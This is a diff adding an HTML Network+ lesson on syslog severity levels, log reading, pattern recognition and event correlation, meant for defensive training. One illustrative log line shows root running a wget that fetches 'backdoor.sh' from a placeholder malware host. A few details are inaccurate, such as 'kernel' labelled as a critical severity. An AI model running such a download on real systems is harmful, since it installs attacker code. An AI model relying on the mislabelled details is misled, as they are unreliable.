@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TR19 — Logs système et réseau · Network+</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Epilogue:wght@400;600;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #07090f; --bg2: #0d1117; --card: #111826;
+    --border: #1c2a3a; --text: #dde4f0; --muted: #536070;
+    --accent: #38bdf8; --green: #22d3a0; --amber: #fbbf24;
+    --red: #f87171; --purple: #a78bfa; --cyan: #06b6d4;
+  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'Epilogue', sans-serif; min-height: 100vh; line-height: 1.75; }
+  body::before { content: ''; position: fixed; inset: 0; background-image: radial-gradient(rgba(56,189,248,0.06) 1px, transparent 1px); background-size: 28px 28px; pointer-events: none; z-index: 0; }
+  .wrap { max-width: 860px; margin: 0 auto; padding: 48px 20px 100px; position: relative; z-index: 1; }
+
+  .breadcrumb { font-family: 'IBM Plex Mono', monospace; font-size: 0.68rem; color: var(--muted); letter-spacing: 1px; margin-bottom: 24px; display: flex; align-items: center; gap: 8px; }
+  .breadcrumb span { color: var(--accent); }
+  .pills { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 20px; }
+  .pill { font-family: 'IBM Plex Mono', monospace; font-size: 0.65rem; letter-spacing: 1px; text-transform: uppercase; padding: 4px 12px; border-radius: 6px; font-weight: 600; }
+  .pill-phase { color: var(--accent); background: rgba(56,189,248,0.08); border: 1px solid rgba(56,189,248,0.2); }
+  .pill-key   { color: var(--purple); background: rgba(167,139,250,0.08); border: 1px solid rgba(167,139,250,0.2); }
+  .pill-lab   { color: var(--green);  background: rgba(34,211,160,0.08);  border: 1px solid rgba(34,211,160,0.2); }
+  .pill-exam  { color: var(--red);    background: rgba(248,113,113,0.08);  border: 1px solid rgba(248,113,113,0.2); }
+  .pill-proto { color: var(--cyan);   background: rgba(6,182,212,0.08);   border: 1px solid rgba(6,182,212,0.2); }
+  .pill-new   { color: var(--amber);  background: rgba(251,191,36,0.08);  border: 1px solid rgba(251,191,36,0.2); }
+  .pill-diff  { color: var(--amber);  background: rgba(251,191,36,0.08);  border: 1px solid rgba(251,191,36,0.2); }
+
+  h1 { font-size: clamp(1.8rem, 4vw, 2.8rem); font-weight: 900; line-height: 1.05; letter-spacing: -1px; margin-bottom: 8px; }
+  h1 span { color: var(--accent); }
+  .tagline { font-family: 'IBM Plex Mono', monospace; font-size: 0.78rem; color: var(--muted); margin-bottom: 36px; display: block; }
+
+  .mastery-card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 20px 24px; margin-bottom: 36px; }
+  .mastery-title { font-family: 'IBM Plex Mono', monospace; font-size: 0.68rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 14px; }
+  .mastery-checks { display: flex; flex-direction: column; gap: 8px; }
+  .mcheck { display: flex; align-items: center; gap: 12px; cursor: pointer; user-select: none; padding: 8px 12px; border-radius: 8px; transition: background 0.15s; }
+  .mcheck:hover { background: rgba(56,189,248,0.04); }
+  .mcheck-box { width: 18px; height: 18px; border: 1.5px solid var(--border); border-radius: 5px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 10px; color: transparent; transition: all 0.18s; }
+  .mcheck-box.done { background: var(--green); border-color: var(--green); color: #fff; }
+  .mcheck-label { font-size: 0.88rem; transition: color 0.2s; }
+  .mcheck.done .mcheck-label { color: var(--muted); text-decoration: line-through; }
+  .mastery-bar-wrap { height: 4px; background: var(--border); border-radius: 99px; margin-top: 16px; overflow: hidden; }
+  .mastery-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--green), var(--accent)); border-radius: 99px; transition: width 0.4s ease; }
+
+  .section { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 28px 30px; margin-bottom: 16px; }
+  .section-label { font-family: 'IBM Plex Mono', monospace; font-size: 0.65rem; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 16px; display: flex; align-items: center; gap: 10px; }
+  .section-label::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+  h2 { font-size: 1.15rem; font-weight: 800; margin-bottom: 14px; }
+  h3 { font-size: 0.95rem; font-weight: 700; color: var(--accent); margin: 22px 0 10px; font-family: 'IBM Plex Mono', monospace; }
+  p { margin-bottom: 14px; font-size: 0.92rem; }
+
+  .callout { border-radius: 10px; padding: 14px 18px; margin: 14px 0; font-size: 0.88rem; display: flex; gap: 12px; align-items: flex-start; }
+  .callout-icon { flex-shrink: 0; font-size: 1rem; margin-top: 1px; }
+  .callout-body { flex: 1; line-height: 1.65; }
+  .callout-body strong { display: block; margin-bottom: 4px; font-size: 0.85rem; }
+  .callout.analogy { background: rgba(167,139,250,0.07); border: 1px solid rgba(167,139,250,0.2); }
+  .callout.analogy .callout-body strong { color: var(--purple); }
+  .callout.tip  { background: rgba(56,189,248,0.06);  border: 1px solid rgba(56,189,248,0.18); }
+  .callout.tip .callout-body strong { color: var(--accent); }
+  .callout.warn { background: rgba(248,113,113,0.07); border: 1px solid rgba(248,113,113,0.2); }
+  .callout.warn .callout-body strong { color: var(--red); }
+  .callout.exam { background: rgba(251,191,36,0.07);  border: 1px solid rgba(251,191,36,0.2); }
+  .callout.exam .callout-body strong { color: var(--amber); }
+  .callout.ok   { background: rgba(34,211,160,0.07);  border: 1px solid rgba(34,211,160,0.2); }
+  .callout.ok .callout-body strong { color: var(--green); }
+
+  .tbl-wrap { overflow-x: auto; margin: 16px 0; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+  th { background: var(--bg2); color: var(--muted); font-family: 'IBM Plex Mono', monospace; font-size: 0.65rem; text-transform: uppercase; letter-spacing: 1px; padding: 10px 14px; text-align: left; border-bottom: 1px solid var(--border); }
+  td { padding: 10px 14px; border-bottom: 1px solid rgba(28,42,58,0.6); vertical-align: top; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(56,189,248,0.02); }
+  td strong { color: var(--accent); }
+  code { font-family: 'IBM Plex Mono', monospace; font-size: 0.8rem; color: var(--accent); background: rgba(56,189,248,0.08); padding: 1px 5px; border-radius: 4px; }
+
+  .trap-box { background: rgba(248,113,113,0.05); border: 2px solid var(--red); border-radius: 10px; padding: 18px 22px; margin: 20px 0; }
+  .trap-title { font-family: 'IBM Plex Mono', monospace; font-weight: 800; font-size: 0.85rem; color: var(--red); margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
+  .trap-content { font-size: 0.88rem; line-height: 1.8; }
+
+  .kp { display: flex; gap: 10px; align-items: flex-start; font-size: 0.88rem; padding: 9px 0; border-bottom: 1px solid rgba(28,42,58,0.5); }
+  .kp:last-child { border-bottom: none; }
+  .kp-dot { color: var(--accent); font-weight: 900; flex-shrink: 0; margin-top: 2px; }
+
+  .nav-footer { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-top: 48px; padding-top: 28px; border-top: 1px solid var(--border); }
+  .nav-btn { font-family: 'IBM Plex Mono', monospace; font-size: 0.72rem; padding: 10px 18px; border-radius: 8px; transition: all 0.2s; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; border: 1px solid var(--border); background: var(--card); color: var(--muted); }
+  .nav-btn.next { background: rgba(56,189,248,0.08); border-color: rgba(56,189,248,0.25); color: var(--accent); }
+  .nav-btn.next:hover { background: rgba(56,189,248,0.15); }
+
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 99px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="breadcrumb">Network+ N10-009 &nbsp;›&nbsp; <span>Module 5.0 — Dépannage réseau</span> &nbsp;›&nbsp; Cours 19</div>
+
+  <div class="pills">
+    <span class="pill pill-phase">Phase 5 · TR19</span>
+    <span class="pill pill-key">🔑 KEY</span>
+    <span class="pill pill-lab">🧪 LAB</span>
+    <span class="pill pill-diff">⚡⚡☆ Moyen</span>
+  </div>
+
+  <h1><span>Logs système</span> et réseau</h1>
+  <span class="tagline">// Syslog — Lecture logs, identification patterns, corrélation événements réseau</span>
+
+  <div class="mastery-card">
+    <div class="mastery-title">Suivi de maîtrise</div>
+    <div class="mastery-checks">
+      <div class="mcheck" onclick="toggleCheck(this)"><div class="mcheck-box">✓</div><span class="mcheck-label">J'ai lu ce cours en entier</span></div>
+      <div class="mcheck" onclick="toggleCheck(this)"><div class="mcheck-box">✓</div><span class="mcheck-label">Je comprends syslog format et severity</span></div>
+      <div class="mcheck" onclick="toggleCheck(this)"><div class="mcheck-box">✓</div><span class="mcheck-label">Je lis et analyse logs système</span></div>
+      <div class="mcheck" onclick="toggleCheck(this)"><div class="mcheck-box">✓</div><span class="mcheck-label">J'identifie patterns et anomalies</span></div>
+      <div class="mcheck" onclick="toggleCheck(this)"><div class="mcheck-box">✓</div><span class="mcheck-label">Je corrèle logs avec événements réseau</span></div>
+      <div class="mcheck" onclick="toggleCheck(this)"><div class="mcheck-box">✓</div><span class="mcheck-label">J'ai réussi tous les exercices sans regarder le cours</span></div>
+    </div>
+    <div class="mastery-bar-wrap"><div class="mastery-bar-fill" id="mastBar"></div></div>
+  </div>
+
+  <!-- SYSLOG INTRO -->
+  <div class="section">
+    <div class="section-label">Logging protocol</div>
+    <h2>Syslog — Introduction</h2>
+
+    <p><strong>Syslog</strong> = Standard protocol logging system/network events. Port UDP 514 (default). Centralized logging multiple devices.</p>
+
+    <h3>// Syslog components</h3>
+    <ul style="margin:10px 0 16px 24px;line-height:1.9">
+      <li><strong>Syslog client</strong> : Device generating logs (router, switch, server, firewall)</li>
+      <li><strong>Syslog server</strong> : Centralized log collection (stores, analyzes logs)</li>
+      <li><strong>Syslog message</strong> : Log entry (timestamp, severity, facility, message)</li>
+    </ul>
+
+    <h3>// Syslog message format</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      <strong>Structure :</strong><br>
+      <Timestamp> <Hostname> <Facility>.<Severity>: <Message><br><br>
+
+      <strong>Example :</strong><br>
+      Mar 01 14:32:15 Router-Core %SYS-5-CONFIG_I: Configured from console by admin<br><br>
+
+      Breakdown :<br>
+      <strong>Timestamp</strong> : Mar 01 14:32:15<br>
+      <strong>Hostname</strong> : Router-Core<br>
+      <strong>Facility</strong> : %SYS (system)<br>
+      <strong>Severity</strong> : 5 (Notification)<br>
+      <strong>Message</strong> : Configured from console by admin
+    </div>
+
+    <h3>// Syslog severity levels</h3>
+    <div class="tbl-wrap">
+      <table>
+        <tr><th>Level</th><th>Name</th><th>Description</th><th>Example</th></tr>
+        <tr style="background:rgba(248,113,113,0.1)">
+          <td><strong>0</strong></td>
+          <td>Emergency</td>
+          <td>System unusable</td>
+          <td>Complete system failure</td>
+        </tr>
+        <tr style="background:rgba(248,113,113,0.08)">
+          <td><strong>1</strong></td>
+          <td>Alert</td>
+          <td>Immediate action needed</td>
+          <td>Temperature critical, shutdown imminent</td>
+        </tr>
+        <tr style="background:rgba(248,113,113,0.06)">
+          <td><strong>2</strong></td>
+          <td>Critical</td>
+          <td>Critical condition</td>
+          <td>Hardware failure detected</td>
+        </tr>
+        <tr style="background:rgba(251,191,36,0.08)">
+          <td><strong>3</strong></td>
+          <td>Error</td>
+          <td>Error condition</td>
+          <td>Interface down, routing protocol failure</td>
+        </tr>
+        <tr style="background:rgba(251,191,36,0.06)">
+          <td><strong>4</strong></td>
+          <td>Warning</td>
+          <td>Warning condition</td>
+          <td>High CPU usage, memory low</td>
+        </tr>
+        <tr style="background:rgba(34,211,160,0.06)">
+          <td><strong>5</strong></td>
+          <td>Notice</td>
+          <td>Normal but significant</td>
+          <td>Interface up, configuration change</td>
+        </tr>
+        <tr style="background:rgba(56,189,248,0.05)">
+          <td><strong>6</strong></td>
+          <td>Informational</td>
+          <td>Info message</td>
+          <td>User login, DHCP lease assigned</td>
+        </tr>
+        <tr>
+          <td><strong>7</strong></td>
+          <td>Debug</td>
+          <td>Debug message</td>
+          <td>Detailed troubleshooting info</td>
+        </tr>
+      </table>
+    </div>
+
+    <div class="callout tip">
+      <span class="callout-icon">💡</span>
+      <div class="callout-body">
+        <strong>Remember severity : Lower number = More serious</strong>
+        0 = Emergency (worst)<br>
+        7 = Debug (least serious)<br>
+        Production : Monitor levels 0-4 (Emergency through Warning).<br>
+        Debug (7) : Troubleshooting only (generates massive logs).
+      </div>
+    </div>
+  </div>
+
+  <!-- READING LOGS -->
+  <div class="section">
+    <div class="section-label">Log analysis</div>
+    <h2>Lecture de logs — Reading & interpreting</h2>
+
+    <h3>// Linux syslog locations</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      <strong>Common log files :</strong><br><br>
+
+      /var/log/syslog → General system messages (Debian/Ubuntu)<br>
+      /var/log/messages → General messages (RHEL/CentOS)<br>
+      /var/log/auth.log → Authentication (login attempts)<br>
+      /var/log/kern.log → Kernel messages<br>
+      /var/log/dmesg → Boot messages<br><br>
+
+      <strong>View logs :</strong><br>
+      $ tail -f /var/log/syslog (real-time monitoring)<br>
+      $ grep "error" /var/log/syslog (search errors)<br>
+      $ less /var/log/syslog (page through)
+    </div>
+
+    <h3>// Windows Event Viewer</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      Event Viewer → Windows Logs :<br><br>
+
+      <strong>Application</strong> : Application events (crashes, errors)<br>
+      <strong>Security</strong> : Login attempts, privilege changes<br>
+      <strong>System</strong> : System services, drivers, hardware<br>
+      <strong>Setup</strong> : Windows updates, installations<br><br>
+
+      Event levels :<br>
+      <strong style="color:var(--red)">Error</strong> : Serious problem (service crash)<br>
+      <strong style="color:var(--amber)">Warning</strong> : Not critical but noteworthy<br>
+      <strong style="color:var(--green)">Information</strong> : Normal operation events
+    </div>
+
+    <h3>// Cisco router/switch logs</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      <strong>View logs :</strong><br>
+      Router# show logging<br><br>
+
+      <strong>Example output :</strong><br>
+      Mar 01 14:25:12: %LINEPROTO-5-UPDOWN: Line protocol on Interface Gi0/1, changed state to up<br>
+      Mar 01 14:30:45: %SYS-5-CONFIG_I: Configured from console by admin on vty0<br>
+      Mar 01 14:32:18: <strong style="color:var(--red)">%LINK-3-UPDOWN: Interface Gi0/2, changed state to down</strong><br><br>
+
+      → Interface Gi0/2 down (severity 3 = Error) ❌
+    </div>
+
+    <h3>// Log entry interpretation example</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      <strong>Entry :</strong><br>
+      Feb 28 23:58:03 Firewall-01 <strong style="color:var(--red)">kernel: [UFW BLOCK]</strong> IN=eth0 OUT= SRC=203.0.113.45 DST=192.168.1.50 PROTO=TCP SPT=54321 DPT=22<br><br>
+
+      <strong>Analysis :</strong><br>
+      <strong>Timestamp</strong> : Feb 28 23:58:03<br>
+      <strong>Host</strong> : Firewall-01<br>
+      <strong>Severity</strong> : kernel (critical)<br>
+      <strong>Event</strong> : UFW BLOCK (firewall blocked connection)<br>
+      <strong>Details</strong> :<br>
+      &nbsp;&nbsp;→ Source IP : 203.0.113.45<br>
+      &nbsp;&nbsp;→ Dest IP : 192.168.1.50<br>
+      &nbsp;&nbsp;→ Protocol : TCP<br>
+      &nbsp;&nbsp;→ Source port : 54321<br>
+      &nbsp;&nbsp;→ Dest port : 22 (SSH)<br><br>
+
+      <strong>Interpretation :</strong><br>
+      → External IP (203.0.113.45) attempted SSH connection to 192.168.1.50<br>
+      → Firewall blocked (potential attack OR legitimate admin blocked)
+    </div>
+  </div>
+
+  <!-- PATTERNS -->
+  <div class="section">
+    <div class="section-label">Pattern recognition</div>
+    <h2>Identification de patterns — Common log patterns</h2>
+
+    <h3>// Pattern #1 : Repeated authentication failures</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      Feb 28 10:15:23 Server-01 sshd: Failed password for admin from 203.0.113.45<br>
+      Feb 28 10:15:25 Server-01 sshd: Failed password for admin from 203.0.113.45<br>
+      Feb 28 10:15:27 Server-01 sshd: Failed password for admin from 203.0.113.45<br>
+      Feb 28 10:15:29 Server-01 sshd: Failed password for admin from 203.0.113.45<br>
+      ...(100+ attempts)<br><br>
+
+      <strong>Pattern :</strong> Multiple failed logins, same IP, rapid succession<br>
+      <strong>Indication :</strong> <strong style="color:var(--red)">Brute force attack</strong> ❌<br>
+      <strong>Action :</strong> Block IP (firewall), enable fail2ban, investigate
+    </div>
+
+    <h3>// Pattern #2 : Interface flapping</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      Mar 01 08:10:15: %LINK-3-UPDOWN: Interface Gi0/5, changed state to down<br>
+      Mar 01 08:10:18: %LINK-3-UPDOWN: Interface Gi0/5, changed state to up<br>
+      Mar 01 08:10:22: %LINK-3-UPDOWN: Interface Gi0/5, changed state to down<br>
+      Mar 01 08:10:25: %LINK-3-UPDOWN: Interface Gi0/5, changed state to up<br>
+      ...(repeating)<br><br>
+
+      <strong>Pattern :</strong> Interface up/down cycling<br>
+      <strong>Indication :</strong> <strong style="color:var(--amber)">Bad cable, loose connection, hardware fault</strong><br>
+      <strong>Action :</strong> Replace cable, check connector, test port
+    </div>
+
+    <h3>// Pattern #3 : Memory/CPU warnings</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      Mar 01 12:30:00: %SYS-4-P2_WARN: System memory usage 95%<br>
+      Mar 01 12:30:05: %SYS-4-P2_WARN: CPU utilization 98% for 5 seconds<br>
+      Mar 01 12:30:10: %SYS-4-P2_WARN: Process "ospf" consuming 85% CPU<br><br>
+
+      <strong>Pattern :</strong> Resource exhaustion warnings<br>
+      <strong>Indication :</strong> <strong style="color:var(--amber)">Overload, possible attack (DoS), runaway process</strong><br>
+      <strong>Action :</strong> Identify cause (show processes cpu), restart process, investigate traffic
+    </div>
+
+    <h3>// Pattern #4 : Configuration changes</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      Mar 01 14:35:20: %SYS-5-CONFIG_I: Configured from console by admin on vty0 (192.168.1.150)<br><br>
+
+      <strong>Pattern :</strong> Config change timestamp<br>
+      <strong>Indication :</strong> <strong style="color:var(--green)">Admin activity (correlation with issues)</strong><br>
+      <strong>Action :</strong> If issues started after config change → Review changes, rollback if needed
+    </div>
+
+    <h3>// Pattern #5 : DHCP exhaustion</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      Mar 01 09:00:00: DHCP: Address pool exhausted for subnet 192.168.1.0/24<br>
+      Mar 01 09:00:05: DHCP: Client aa:bb:cc:dd:ee:ff request failed - no addresses available<br>
+      ...(multiple denials)<br><br>
+
+      <strong>Pattern :</strong> DHCP pool full, clients denied<br>
+      <strong>Indication :</strong> <strong style="color:var(--red)">Pool too small OR rogue DHCP attack</strong><br>
+      <strong>Action :</strong> Expand pool, check for rogue clients, investigate leases
+    </div>
+  </div>
+
+  <!-- CORRELATION -->
+  <div class="section">
+    <div class="section-label">Event correlation</div>
+    <h2>Corrélation avec événements réseau — Connecting the dots</h2>
+
+    <h3>// Correlation example #1 : Network outage</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      <strong>User report :</strong> "No Internet access since 10:15 AM"<br><br>
+
+      <strong>Timeline from logs :</strong><br><br>
+
+      10:14:32 : Router-Core %SYS-5-CONFIG_I: Configured from console by admin<br>
+      → Admin made config change<br><br>
+
+      10:14:58 : Router-Core %LINEPROTO-5-UPDOWN: Line protocol on Gi0/0 (WAN), changed state to <strong style="color:var(--red)">down</strong><br>
+      → WAN interface went down<br><br>
+
+      10:15:03 : Router-Core %LINK-3-UPDOWN: Interface Gi0/0, changed state to down<br>
+      → Link physically down<br><br>
+
+      <strong>Correlation :</strong><br>
+      → Admin config change (10:14:32)<br>
+      → Immediately followed by WAN down (10:14:58)<br>
+      → <strong>Conclusion :</strong> Config change caused outage (misconfiguration)<br>
+      → <strong>Action :</strong> Review config change, rollback
+    </div>
+
+    <h3>// Correlation example #2 : Performance degradation</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      <strong>User report :</strong> "Network very slow starting 2:00 PM"<br><br>
+
+      <strong>Logs :</strong><br><br>
+
+      14:00:15 : Switch-01 %SPANTREE-2-LOOPBACK_DETECTED: Loopback detected on Gi0/10<br>
+      → Switching loop detected<br><br>
+
+      14:00:18 : Switch-01 %PM-4-ERR_DISABLE: bpduguard error on Gi0/10, port disabled<br>
+      → Port shut down (BPDU Guard)<br><br>
+
+      14:00:20 : Router-Core %SYS-4-P2_WARN: CPU utilization 95%<br>
+      → Router CPU spiked<br><br>
+
+      <strong>Correlation :</strong><br>
+      → Switching loop created (user plugged both ends cable? rogue switch?)<br>
+      → Broadcast storm overwhelmed router CPU<br>
+      → Network slow until loop broken (port disabled)<br>
+      → <strong>Action :</strong> Investigate Gi0/10 (what device connected?)
+    </div>
+
+    <h3>// Correlation example #3 : Security incident</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      <strong>Multiple log sources :</strong><br><br>
+
+      <strong>Firewall logs :</strong><br>
+      03:15:00 : [BLOCK] SRC=45.67.89.100 DST=192.168.1.50 DPT=22 (100+ attempts)<br>
+      → External IP scanning port 22 (SSH)<br><br>
+
+      <strong>Server auth.log :</strong><br>
+      03:15:23 : Failed password for root from 45.67.89.100<br>
+      03:15:25 : Failed password for root from 45.67.89.100<br>
+      ...(50+ failures)<br>
+      03:17:45 : <strong style="color:var(--red)">Accepted password for root from 45.67.89.100</strong><br>
+      → Attacker successfully logged in ❌<br><br>
+
+      03:18:00 : Server syslog: User root executed: wget http://malware.com/backdoor.sh<br>
+      → Attacker downloading malware<br><br>
+
+      <strong>Correlation :</strong><br>
+      → Port scan → Brute force → Successful breach → Malware installation<br>
+      → <strong>Action :</strong> Isolate server, block IP, incident response, forensics
+    </div>
+
+    <div class="callout warn">
+      <span class="callout-icon">⚠️</span>
+      <div class="callout-body">
+        <strong>Time synchronization critical for correlation</strong>
+        NTP (Network Time Protocol) : All devices synchronized time.<br>
+        Without sync : Logs different devices show different times → Correlation impossible.<br>
+        Always configure NTP servers (accurate timestamps essential troubleshooting).
+      </div>
+    </div>
+  </div>
+
+  <!-- LOG TOOLS -->
+  <div class="section">
+    <div class="section-label">Analysis tools</div>
+    <h2>Outils d'analyse logs — Log management</h2>
+
+    <h3>// Command-line tools</h3>
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin:14px 0;font-family:'IBM Plex Mono',monospace;font-size:0.75rem;line-height:1.8;">
+      <strong>grep</strong> : Search pattern<br>
+      $ grep "error" /var/log/syslog<br>
+      $ grep -i "failed" /var/log/auth.log (case-insensitive)<br>
+      $ grep -A 5 "Interface down" /var/log/messages (show 5 lines after match)<br><br>
+
+      <strong>tail</strong> : View end of file / real-time monitoring<br>
+      $ tail -f /var/log/syslog (follow mode - live updates)<br>
+      $ tail -n 100 /var/log/syslog (last 100 lines)<br><br>
+
+      <strong>awk</strong> : Extract fields<br>
+      $ awk '{print $1, $2, $3, $5}' /var/log/syslog (timestamp + hostname + severity)<br><br>
+
+      <strong>sort/uniq</strong> : Count occurrences<br>
+      $ grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c<br>
+      → Count failed logins per IP
+    </div>
+
+    <h3>// Centralized log management (SIEM)</h3>
+    <ul style="margin:10px 0 16px 24px;line-height:1.9">
+      <li><strong>Splunk</strong> : Commercial SIEM (powerful, expensive)</li>
+      <li><strong>ELK Stack</strong> : Elasticsearch + Logstash + Kibana (open source)</li>
+      <li><strong>Graylog</strong> : Open source log management</li>
+      <li><strong>Syslog-ng</strong> : Advanced syslog server</li>
+    </ul>
+
+    <h3>// Benefits centralized logging</h3>
+    <ul style="margin:10px 0 16px 24px;line-height:1.9">
+      <li><strong>Single pane of glass</strong> : All devices one location</li>
+      <li><strong>Correlation</strong> : Automatic correlation events across devices</li>
+      <li><strong>Retention</strong> : Long-term storage (compliance, forensics)</li>
+      <li><strong>Alerting</strong> : Real-time alerts critical events</li>
+      <li><strong>Search</strong> : Fast search millions logs</li>
+      <li><strong>Visualization</strong> : Dashboards, graphs, trends</li>
+    </ul>
+  </div>
+
+  <!-- RÉSUMÉ -->
+  <div class="section">
+    <div class="section-label">Résumé</div>
+    <h2>🔑 Ce que tu dois retenir absolument</h2>
+    <div>
+      <div class="kp"><span class="kp-dot">→</span><span><strong>Syslog</strong> : Protocol logging UDP 514. Severity levels 0-7 (0=Emergency worst, 7=Debug least serious). Format: Timestamp Hostname Facility.Severity Message. Monitor 0-4 (Emergency-Warning) production</span></div>
+      <div class="kp"><span class="kp-dot">→</span><span><strong>Lecture logs</strong> : Linux /var/log/syslog, /var/log/messages, /var/log/auth.log. Windows Event Viewer (Application, Security, System). Cisco show logging. Commands: tail -f (real-time), grep (search), awk (parse)</span></div>
+      <div class="kp"><span class="kp-dot">→</span><span><strong>Patterns</strong> : Repeated auth failures (brute force), interface flapping (bad cable), memory/CPU warnings (overload/DoS), config changes (correlation outages), DHCP exhaustion (pool small/rogue). Recognize common patterns quickly</span></div>
+      <div class="kp"><span class="kp-dot">→</span><span><strong>Corrélation</strong> : Timeline logs multiple devices. NTP essential (synchronized timestamps). Example: Config change → Interface down → Outage (correlation proves cause). Security: Scan → Brute force → Breach (attack chain)</span></div>
+      <div class="kp"><span class="kp-dot">→</span><span><strong>Outils</strong> : Command-line (grep, tail -f, awk, sort | uniq -c). SIEM (Splunk, ELK Stack, Graylog) centralized management. Benefits: Correlation, retention, alerting, search, dashboards. Critical large networks</span></div>
+      <div class="kp"><span class="kp-dot">→</span><span><strong>Best practices</strong> : Enable logging all devices, configure syslog server (centralize), NTP sync (accurate time), monitor severity 0-4, review logs regularly (proactive), automate alerts critical events (SIEM)</span></div>
+    </div>
+  </div>
+
+  <div class="nav-footer">
+    <a class="nav-btn" href="#">← Cours 18 : Wireshark</a>
+    <span style="font-family:'IBM Plex Mono',monospace;font-size:0.7rem;color:var(--muted)">TR19 - Phase 5</span>
+    <a class="nav-btn next" href="#">Cours 20 : Performance réseau →</a>
+  </div>
+
+</div>
+<script>
+const MKEY = 'netplus_m5_tr19_mastery';
+let mastery = [];
+try { mastery = JSON.parse(localStorage.getItem(MKEY) || '[]'); } catch(e) {}
+function initMastery() {
+  document.querySelectorAll('.mcheck').forEach((el, i) => {
+    if(mastery[i]) { el.classList.add('done'); el.querySelector('.mcheck-box').classList.add('done'); }
+  });
+  updateBar();
+}
+function toggleCheck(el) {
+  const i = Array.from(document.querySelectorAll('.mcheck')).indexOf(el);
+  const isDone = el.classList.contains('done');
+  const box = el.querySelector('.mcheck-box');
+  isDone ? (el.classList.remove('done'), box.classList.remove('done'), mastery[i] = false)
+         : (el.classList.add('done'), box.classList.add('done'), mastery[i] = true);
+  localStorage.setItem(MKEY, JSON.stringify(mastery));
+  updateBar();
+}
+function updateBar() {
+  const total = document.querySelectorAll('.mcheck').length;
+  const done  = document.querySelectorAll('.mcheck.done').length;
+  document.getElementById('mastBar').style.width = Math.round(done/total*100) + '%';
+}
+initMastery();
+</script>
+  <div style="margin-top:40px;text-align:center;">
+  <a class="nav-btn" href="index.html">← Accueil — Plan de cours</a>
+</body>
+</html>
